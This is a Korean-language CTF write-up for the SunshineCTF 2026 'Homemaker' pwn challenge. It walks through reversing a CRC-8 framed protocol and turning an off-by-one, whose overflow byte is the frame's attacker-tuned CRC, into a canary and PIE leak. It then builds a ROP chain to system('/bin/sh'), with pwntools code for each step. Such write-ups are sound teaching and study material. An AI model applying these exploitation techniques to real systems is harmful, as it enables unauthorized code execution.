---
title: "Homemaker — CRC를 공격자의 한 바이트로"
date: 2026-10-21
tags: ["pwn", "rop", "off-by-one", "crc", "protocol"]
categories: ["SunshineCTF 2026"]
summary: "무결성 검사용 CRC 바이트가 off-by-one의 소스가 된다. 방어 수단이 그대로 capacity를 늘리는 쓰기 원시 기능으로 뒤집힌다."
translationKey: "homemaker"
---

## 개요

```
homemaker   amd64, PIE, Full RELRO, canary, NX, SHSTK, IBT, stripped
```

접속하면 배너가 나온다.

```
MODEL 7 "HOMEMAKER" DOMESTIC AUTOMATON
SERVO-COMMAND LINK  ::  REV 3  ::  UNIT VB-04
>> INSERT SERVICE KEY CARD TO CONTINUE <<
```

천공카드로 프로그램을 넣는 1950년대풍 가정용 로봇이라는 설정이고, 그 컨셉이 구현을 그대로 규정한다.

| 컨셉 | 구현 |
|---|---|
| 카드 한 장 = 명령 하나 | 대화형 텍스트가 아니라 고정 형식 프레임 |
| 서비스 키 카드 | opcode 1 인증, 키는 하드코딩 |
| 기계에 들어 있는 카드 | `data` + `capacity` + `state` 구조체 |
| 카드가 찢어질 수 있음 | CRC-8 무결성 검사 |
| 텔레타이프 | 프레임 구분자가 ANSI 이스케이프 |

`help`를 쳐도 반응이 없다. 텍스트 명령을 받지 않으므로 프레임을 통째로 밀어넣어야 한다.

## 1. 프로토콜

### 프레임

수신 함수 `FUN_001014cc`가 형식을 알려준다.

```
1b 5b | len(2 BE) | payload[len] | crc8 | 1b 5c
```

`ESC [`로 열고 `ESC \`로 닫는다. `payload[0]`이 opcode다.

수신 버퍼 `DAT_00104860`의 배치가 뒤에서 중요해진다.

```
+0          1b 5b
+2          len (2 BE)
+4          payload[0] .. payload[len-1]
+len+4      crc
+len+5      1b 5c
```

길이 상한은 파서의 이 검사에서 나온다.

```c
if ((uVar4 == 0) || (0x800 < (ulong)uVar4 + 7)) {
    *param_3 = 0xe2;
```

`len + 7 <= 0x800`이므로 `len`은 `0x7f9`까지다.

### CRC-8

다항식 `0x2f`, 초기값 0, 반사 없음.

```python
def crc8(data):
    crc = 0
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = ((crc << 1) ^ 0x2f) & 0xff if crc & 0x80 else (crc << 1) & 0xff
    return crc
```

파서가 받은 CRC와 직접 계산한 값을 비교해 불일치면 `0xe3`으로 거부한다. 여기까지는 정상 통신을 위한 구현이고 공격과 무관하다.

### 상태 코드

응답 첫 바이트가 상태다. 역공학 중 어디가 틀렸는지 바로 알려주므로 표로 만들어 두면 작업이 빨라진다.

```
0xe1 bad SOH    0xe2 bad length   0xe3 bad crc    0xe4 bad terminator
0xe5 auth failed    0xe6 not authenticated    0xe7 unknown opcode
```

## 2. 인증 관문

opcode 1만 인증 전에 통과한다.

```c
if ((DAT_00104864 == '\x01') || (local_124 != 0)) {
```

`local_124`가 인증 플래그다. **카드 구조체가 아니라 메인 루프의 스택 지역변수**이고, 이 점이 뒤에서 한 번 쓸모가 있다.

인증 핸들러는 길이를 정확히 5로 요구한다.

```c
if (param_3 == 5) {
    iVar2 = FUN_00101289((uint)*(byte *)(param_2 + 4) |
                         (uint)*(byte *)(param_2 + 1) << 0x18 |
                         (uint)*(byte *)(param_2 + 2) << 0x10 |
                         (uint)*(byte *)(param_2 + 3) << 8);
    if (iVar2 == 0) {
        *(undefined2 *)(param_1 + 0x100) = 0x100;
        *(undefined2 *)(param_1 + 0x102) = 1;
```

`payload[1..4]`를 빅엔디안으로 모아 `0x1337c35f`와 비교한다. 키가 바이너리에 박혀 있어 우회할 게 없다.

```python
p.send(frame(b'\x01' + p32(0x1337c35f, endian='big')))
```

그런데 이 관문이 두 가지 역할을 한다.

**역공학 검증서다.** 프레임·길이·CRC를 전부 맞춰야 통과하므로, 여기를 넘으면 프로토콜 구현이 끝났다는 뜻이다.

**취약점을 활성화한다.** `capacity`가 0으로 시작하는데 인증이 `0x100`으로 올린다. 인증 전에는 쓰기가 가드를 넘지 못한다.

그리고 이 두 줄이 `local_118`을 배열이 아니라 구조체로 보게 만드는 단서다. 256바이트 배열의 `+0x100`과 `+0x102`에 쓴다는 건 뒤에 필드가 더 있다는 뜻이다.

## 3. 구조체 레이아웃

```c
struct card {
    char     data[0x100];   // +0x000
    uint16_t capacity;      // +0x100
    uint16_t state;         // +0x102
    uint32_t pad;           // +0x104
    uint64_t canary;        // +0x108
    uint64_t saved_rbp;     // +0x110
    uint64_t retaddr;       // +0x118
};
```

Ghidra가 `local_118 [256]`로 이름 붙이지만 실제 주소는 `rbp-0x110`이다. `local_X`는 `(rbp+8) - X`에 놓이기 때문이다.

```
card+0x100  capacity   rbp-0x10
card+0x108  canary     rbp-0x08
card+0x110  saved rbp  rbp+0x00
card+0x118  retaddr    rbp+0x08
```

변수명의 숫자를 오프셋으로 그대로 쓰면 8바이트가 어긋난다.

`state`는 쓰기마다 증가하는 카운터다.

```c
*(short *)(param_1 + 0x102) = *(short *)(param_1 + 0x102) + 1;
```

인증 상태와는 무관하다. 앞서 본 대로 그쪽은 `local_124`에 있다.

## 4. off-by-one

카드 쓰기 핸들러 `FUN_0010174c`다.

```c
if (*(ushort *)(param_1 + 0x100) < (ushort)(param_3 - 1U)) {
    uVar2 = 0xffffffe2;
}
else {
    for (local_1c = 0; local_1c <= (ushort)(param_3 - 1U); local_1c = local_1c + 1) {
        *(undefined1 *)(param_1 + (int)(uint)local_1c) =
             *(undefined1 *)((ulong)local_1c + param_2 + 1);
    }
```

`param_3`이 프레임 길이이고 `n = len - 1`이다. 가드는 `capacity < n`, 루프는 `i <= n`. 즉 **`len`바이트를 쓰는데 허용 기준은 `len - 1`이다.**

`len = 0x101`을 보내면 `n = 0x100`이다.

```
가드   0x100 < 0x100   거짓 → 통과
루프   i = 0 .. 0x100  → 0x101바이트 기록
```

`data[0x100]`은 배열 밖, `capacity`의 하위 바이트다.

### 넘치는 바이트는 어디서 오는가

소스는 `payload[1 + 0x100]` = `payload[0x101]`인데, 페이로드는 `0x101`바이트라 인덱스가 `0x100`까지다. 수신 버퍼 배치를 보면 그 한 칸 뒤가 무엇인지 나온다.

```
+4       payload[0] .. payload[0x100]
+0x105   crc            ← payload + 0x101
+0x106   1b 5c
```

**넘치는 바이트는 프레임의 CRC다.**

## 5. CRC를 공격 수단으로

CRC는 페이로드로 결정되고 페이로드는 내가 만든다. 그러면 CRC를 원하는 값으로 유도할 수 있다.

```python
def tune_crc(payload, idx, target):
    buf = bytearray(payload)
    for b in range(256):
        buf[idx] = b
        if crc8(buf) == target:
            return bytes(buf)
    raise RuntimeError('no byte at %d yields crc %#04x' % (idx, target))
```

`0x100`바이트 중 대부분이 의미 없는 채움 바이트다. 그중 한 자리를 자유 변수로 두고 256가지를 전부 시도한다. CRC-8의 출력 공간이 256가지라 대개 해가 있다.

```python
st = write_card(p, b'A' * 0x100, crc_target=0xff, tweak=0x80)
```

`capacity`의 하위 바이트만 바뀌므로 `0x0100`이 `0x01ff`가 된다. `0x100`을 다시 만들 수는 없지만 `retaddr`이 `0x118`에 있으니 충분하다.

여기가 문제의 전환점이다. 무결성 검사용 값이 공격자가 지정하는 한 바이트 쓰기로 바뀐다.

## 6. 누수

읽기 핸들러가 `capacity`만큼 뱉는다.

```c
FUN_001013a2(0, buf, *(uint16_t *)(buf + 0x100));
```

`0x1ff`바이트를 받으면 한 번에 셋이 나온다.

```python
canary    = u64(dump[0x108:0x110])
saved_rbp = u64(dump[0x110:0x118])
retaddr   = u64(dump[0x118:0x120])
```

`retaddr`은 `FUN_00101865` 호출 직후 지점이다.

```
1a9a:  call   1865
1a9f:  mov    $0x0,%eax     ← 리턴 지점
```

```python
elf.address = retaddr - 0x1a9f
assert canary & 0xff == 0, 'canary low byte should be 0'
assert elf.address & 0xfff == 0, 'pie base not page aligned'
```

두 `assert`가 오프셋 추정을 즉시 검증한다. PIE 베이스는 페이지 정렬이고 glibc 카나리의 하위 바이트는 0이다.

## 7. 리턴 주소 덮기

`0x118`까지 전부 다시 써야 하고, 그 구간에 보존해야 할 것들이 들어 있다.

```python
data = bytearray((b'B' * 8 + b'/bin/sh\x00').ljust(0x100, b'B'))
data += p16(0x1ff)
data += p16(1)
data += p32(0)
data += p64(canary)
data += p64(saved_rbp)
data += chain
data += b'C' * 8
```

`capacity`를 빠뜨리면 `ljust(0x108, b'B')` 같은 코드가 `0x4242`를 써버린다. 그러면 응답 함수의 길이 가드에 걸린다.

```c
uVar4 = param_3 + 1;
if ((ulong)uVar4 + 7 < 0x801) {
```

`0x4242 + 8`은 `0x801`을 넘으므로 `write`가 아예 실행되지 않는다. 클라이언트는 응답을 기다리며 멈춘다. **증상이 크래시가 아니라 침묵이라** 원인을 짚기 까다로운 종류의 실수다.

`leave`가 `saved_rbp`를 pop하므로 그쪽도 누수한 값을 그대로 넣는다.

### 이번 쓰기의 off-by-one

같은 버그가 또 일어난다. `data` 길이가 `0x140`이므로 CRC 한 바이트가 `card+0x140`에 떨어진다. 체인은 `0x118`에서 `0x137`까지이므로 체인 밖이다. 끝의 `b'C' * 8`은 그 여유를 더 벌리는 용도이고, 없어도 `0x138`에 떨어져 체인에 닿지는 않는다.

## 8. /bin/sh 주소

`pop rdi`에 넘길 문자열 주소가 필요하다.

처음에는 스택에서 구하려 했다. `saved_rbp`를 누수했으니 거기서 카드 주소를 역산하는 방향이다.

```python
buf_addr = saved_rbp - 0x130
```

`saved_rbp`는 호출자 프레임의 rbp라 현재 프레임까지의 거리를 `push rbp` / `sub rsp` / `call`의 효과로 따라가야 한다. 어긋나면 이렇게 드러난다.

```
sh: 1: \x02: not found
sh: 1: \xe0\xd2*}ov: not found
```

`system`은 호출됐고 인자만 엉뚱한 상태다.

응답 전송 함수를 보면 계산이 통째로 불필요해진다.

```c
if (param_3 != 0) {
    memcpy(&DAT_00104065, param_2, (ulong)param_3);
}
```

**읽기 명령이 카드를 BSS로 복사한다.** BSS 주소는 PIE 베이스 + 고정 오프셋이고 베이스는 이미 알고 있다.

### 응답이 그 문자열을 덮는다

마지막에 opcode 4를 보내면 `FUN_001013a2(0, 0, 0)`이 호출된다. 데이터가 없어도 CRC와 종단자는 쓴다.

```c
uVar4 = param_3 + 1;                       /* = 1 */
...
(&DAT_00104060)[(int)(uVar4 + 4)] = uVar3;  /* 0x4065 */
(&DAT_00104060)[(int)(uVar4 + 5)] = 0x1b;   /* 0x4066 */
(&DAT_00104060)[(int)(uVar4 + 6)] = 0x5c;   /* 0x4067 */
```

하필 BSS 사본의 카드 0~2바이트 자리다. 그래서 문자열을 카드 안에서 8바이트 뒤로 밀고, 앞의 `b'B' * 8`이 그 세 바이트를 받아낸다.

```python
binsh = elf.address + 0x4065 + 8
```

`0x406d`는 응답이 건드리는 구간을 벗어난다.

## 9. system은 왜 거기 있나

체인이 `system@plt`를 직접 부른다. libc 누수가 없는데 가능한 이유는 프로그램 자신이 `system`을 쓰기 때문이다.

```c
void FUN_001012d2(void)
{
  system("/bin/echo -n \'\'");
  ...
}
```

opcode 5의 핸들러다. 하는 일이 빈 문자열을 출력하는 것뿐이고, **유일한 효과가 `system`을 임포트 테이블에 넣는 것이다.**

Full RELRO라 GOT가 로드 시점에 이미 채워져 있으므로 opcode 5를 보낼 필요조차 없다. 익스플로잇도 보내지 않는다. 그 opcode는 쓰이기 위해 있는 게 아니라 존재하기 위해 있다.

## 10. 최종 체인

```python
chain = flat(
    elf.address + 0x12aa,
    binsh,
    elf.address + 0x101a,
    elf.address + 0x10c0,
)
```

`0x101a`의 `ret`은 스택 16바이트 정렬용이다.

트리거는 opcode 4다.

```c
case '\x04':
    FUN_001013a2(0,0,0);
    goto LAB_00101a69;
```

`LAB_00101a69`가 카나리 검사 후 정상 리턴하는 지점이다.

```
카나리 검사   복원해뒀으므로 통과
leave         rsp = rbp, rbp 팝
ret           card+0x118의 체인으로 점프
```

순서가 하나 더 있다. 체인을 쓴 다음 **opcode 3을 한 번 보내야 한다.** 읽기 자체가 목적이 아니라 카드를 BSS로 복사해 `/bin/sh`를 `0x406d`에 놓기 위해서다.

```python
st = write_card(p, bytes(data))
read_card(p)
p.send(frame(b'\x04'))
```

## 짚어둘 점

- 가드와 루프의 경계가 한 글자 차이로 어긋난다. `capacity < n`과 `i <= n`은 각각 보면 자연스럽고, 둘을 같이 봐야 `len`바이트를 쓰면서 `len - 1`만 검사한다는 게 보인다.
- 넘치는 바이트의 **출처**를 끝까지 따라가야 경로가 나온다. 한 바이트가 넘친다는 사실만으로는 쓸 수 없고, 그게 CRC여서 내가 조종할 수 있다는 데까지 가야 쓰기 원시 기능이 된다.
- `capacity` 같은 길이 필드는 읽기와 쓰기가 같이 참조한다. 한 번 늘리면 누수와 덮어쓰기가 동시에 열린다.
- 길이 가드 위반이 크래시가 아니라 무응답으로 나타난다. `0x4242 + 8 > 0x801`로 `write`가 생략될 뿐이라 프로세스는 멀쩡하다. 멈추면 구조체 필드를 망쳤는지부터 본다.
- 쓰이지 않는 opcode가 임포트를 만든다. `system`이 바이너리에 있는지는 `FUN_001012d2` 하나로 결정되고, 그게 체인 길이를 4슬롯으로 줄인다.
- checksec에 SHSTK와 IBT가 켜져 있지만 런타임에서 강제되지 않았다. ELF 속성 선언만으로는 효력이 없다.

---

전체 스크립트: [ctf-writeups/2026-sunshine/homemaker](https://github.com/wjddml/ctf-writeups/tree/main/2026-sunshine/homemaker)
